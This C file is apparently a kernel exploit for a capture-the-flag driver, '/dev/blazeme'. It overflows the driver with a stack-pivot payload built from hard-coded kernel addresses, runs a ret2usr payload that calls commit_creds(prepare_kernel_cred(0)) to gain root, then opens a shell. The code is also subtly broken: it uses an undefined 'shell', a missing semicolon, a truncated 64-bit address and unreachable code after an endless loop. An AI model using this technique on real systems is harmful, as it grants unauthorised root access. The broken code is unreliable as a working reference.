// Consulted https://blog.overninethousand.de/syscall-write-up/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

// from /proc/kallsyms
// 8003f56c T commit_creds
// 8003f924 T prepare_kernel_cred

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
  __attribute__((regparm(3)));
typedef int (*commit_creds_t)(struct cred *new)
  __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

void get_root(){
    commit_creds(prepare_kernel_cred(0));  
}

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

static void save_state() {
  asm volatile(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "pushfq\n"
      "popq %2\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
      :
      : "memory");
}

static void restore_state() {
  asm volatile(
      "swapgs ;"
      "movq %0, 0x20(%%rsp)\t\n"
      "movq %1, 0x18(%%rsp)\t\n"
      "movq %2, 0x10(%%rsp)\t\n"
      "movq %3, 0x08(%%rsp)\t\n"
      "movq %4, 0x00(%%rsp)\t\n"
      "iretq"
      :
      : "r"(user_ss), "r"((unsigned long)0x1740000), "r"(user_rflags), "r"(user_cs), "r"(shell));
}

//this payload executes privesc in kernel, then returns to user space with iretq
static void kernel_payload(){
  get_root();
  restore_state();
}

int iretq = 0xffffffff810aa777;

int main(){
    // Set up kernel calls
  commit_creds = (void *)0xffffffff81063960ull;
  prepare_kernel_cred = (void *)0xffffffff81063b50ull;

  // set up kernel payload to privesc
  unsigned long *fake_stack = mmap((void *)0x1700000, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x32 | MAP_POPULATE | MAP_FIXED | MAP_GROWSDOWN, -1, 0);
  fake_stack[0x40000 / 8] = (unsigned long)kernel_payload;

  //ret2usr shellcode, just jumps to r0 (first arg)
  printf("UID is %d\n", getuid());

  unsigned long pivot[8];
  for (int i = 0; i < 8; i++){ 
    pivot[i] = 0xffffffff8109c604ull;  // mov esp, 0x1740000; ret;
  }

  char payload[64];
  strncpy(payload, "AA", 2);
  strncpy(&payload[2], (const char*)pivot, 64);

  // Now, spray payload all over stack. Eventually we overwrite RIP and jump to shellcode at 0x1740000
  int fd = open("/dev/blazeme", O_RDWR);
  for (;;) {
    write(fd, payload, 64);
  }

  // Check that we're root!
 printf("UID now %d\n", getuid());

 system("/bin/sh")
}
